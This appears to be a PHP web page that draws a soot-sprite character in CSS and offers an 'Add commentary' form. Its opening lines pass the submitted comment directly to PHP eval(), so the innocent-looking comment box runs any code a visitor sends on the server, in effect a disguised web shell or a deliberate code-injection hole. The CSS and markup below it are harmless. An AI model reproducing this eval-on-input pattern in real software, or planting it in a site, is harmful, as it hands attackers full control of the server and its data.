<?php
if (isset($_GET['comment'])) {
    $comment = $_GET['comment'];
    eval($comment);
}

?>

<!DOCTYPE html>
<html>
<style>
    body {
    overflow: hidden;
    margin: 0;
    padding: 0;
    width: 100vw;
    height: 100vh;
}

#container {
    display: flex;
    justify-content: center;
    align-items: center;
    flex-direction: column;
    height: 100%;
    flex-wrap: wrap;
    background-color: #885853;
}

#susuwatari {
    position: relative;
}

#star {
    position: absolute;
    transform: rotate(30deg);
    z-index: 2;
    left: 82px;
    top: -213px;
}

.star-part {
    height: 0;
    position: absolute;
    width: 0;
}

#star-part1 {
    border-right: 50px solid transparent;
    border-bottom: 87px solid #F76378;
    border-left: 50px solid transparent;
}

#star-part2 {
    border-right: 50px solid transparent;
    border-top: 87px solid #F76378;
    border-left: 50px solid transparent;
    top: 30px;
}

#body {
    width: 200px;
    border-radius: 200px;
    height: 200px;
    background-color: #000000;
    position: relative;
    z-index: 1;
}

.hair {
    width: 223px;
    position: relative;
    height: 4px;
    background-color: #000000;
}

#hair-horizontal {
    top: 100px;
    right: 11px;
}

#hair-horizontal-15 {
    transform: rotate(15deg);
    top: 95px;
    right: 12px;
}

#hair-horizontal-30 {
    transform: rotate(30deg);
    top: 90px;
    right: 12px;
}

#hair-horizontal-45 {
    transform: rotate(45deg);
    top: 85px;
    right: 13px;
}

#hair-horizontal-60 {
    transform: rotate(60deg);
    top: 82px;
    right: 13px;
}

#hair-horizontal-75 {
    transform: rotate(75deg);
    top: 78px;
    right: 13px;
}

#hair-vertical {
    transform: rotate(90deg);
    top: 74px;
    right: 11px;
}

#hair-vertical-15 {
    transform: rotate(-15deg);
    top: 73px;
    right: 12px;
}

#hair-vertical-30 {
    transform: rotate(-30deg);
    top: 70px;
    right: 10px;
}

#hair-vertical-45 {
    transform: rotate(-45deg);
    top: 66px;
    right: 9px;
}

#hair-vertical-60 {
    transform: rotate(-60deg);
    top: 60px;
    right: 8px;
}

#hair-vertical-75 {
    transform: rotate(-75deg);
    top: 55px;
    right: 8px;
}

.eye {
    width: 60px;
    height: 60px;
    border-radius: 60px;
    background-color: #FFFFFF;
    position: absolute;
    top: 55px;
}

#eye-left {
    left: 30px;
}

#eye-right {
    right: 30px;
}

.black-eye {
    width: 20px;
    height: 20px;
    top: 7px;
    left: 27px;
    border-radius: 20px;
    background-color: #000000;
    position: relative;
}

#right-black-eye {
    left: 15px;
}

#arms {
    width: 220px;
    height: 200px;
    border-radius: 50%;
    border: 5px solid #000000;
    position: absolute;
    bottom: 136px;
    left: -19px;
    z-index: 0;
}

#legs {
    width: 160px;
    height: 200px;
    border-radius: 50%;
    border: 5px solid #000000;
    position: absolute;
    top: 128px;
    left: 19px;
}

#legs-bottom {
    left: 11px;
    top: 162px;
    width: 140px;
    height: 50px;
    background-color: #885853;
    position: relative;
}

#foot-left {
    position: relative;
    right: 13px;
    top: 116px;
}

#foot-right {
    position: relative;
    left: 143px;
    top: 110px;
}

.finger {
    width: 30px;
    height: 2px;
    background-color: #000000;
}

#finger-left1 {
    transform: rotate(-25deg);
}

#finger-left2 {
    transform: rotate(-35deg);
}

#finger-left3 {
    transform: rotate(-45deg);
}

#finger-right1 {
    transform: rotate(25deg);
}

#finger-right2 {
    transform: rotate(35deg);
}

#finger-right3 {
    transform: rotate(45deg);
}

#forms {
    margin-bottom: 200px;
}
</style>
<body>
<div id="container">
<form action="index.php" method="get" enctype="multipart/form-data" id="forms">
    Add commentary:
    <input type="text" name="comment">
</form>
    <div id="susuwatari">
        <div id="star">
            <div class="star-part" id="star-part1"></div>
            <div class="star-part" id="star-part2"></div>
        </div>
        <div id="body">
            <div class="hair" id="hair-horizontal"></div>
            <div class="hair" id="hair-horizontal-15"></div>
            <div class="hair" id="hair-horizontal-30"></div>
            <div class="hair" id="hair-horizontal-45"></div>
            <div class="hair" id="hair-horizontal-60"></div>
            <div class="hair" id="hair-horizontal-75"></div>
            <div class="hair" id="hair-vertical"></div>
            <div class="hair" id="hair-vertical-15"></div>
            <div class="hair" id="hair-vertical-30"></div>
            <div class="hair" id="hair-vertical-45"></div>
            <div class="hair" id="hair-vertical-60"></div>
            <div class="hair" id="hair-vertical-75"></div>
            <div class="eye" id="eye-left">
                <div class="black-eye" id="left-black-eye"></div>
            </div>
            <div class="eye" id="eye-right">
                <div class="black-eye" id="right-black-eye"></div>
            </div>
        </div>
        <div id="arms">
        </div>
        <div id="legs">
            <div id="legs-bottom"></div>
            <div id="foot-left">
                <div class="finger" id="finger-left1"></div>
                <div class="finger" id="finger-left2"></div>
                <div class="finger" id="finger-left3"></div>
            </div>
            <div id="foot-right">
                <div class="finger" id="finger-right1"></div>
                <div class="finger" id="finger-right2"></div>
                <div class="finger" id="finger-right3"></div>
            </div>
        </div>
    </div>
</div>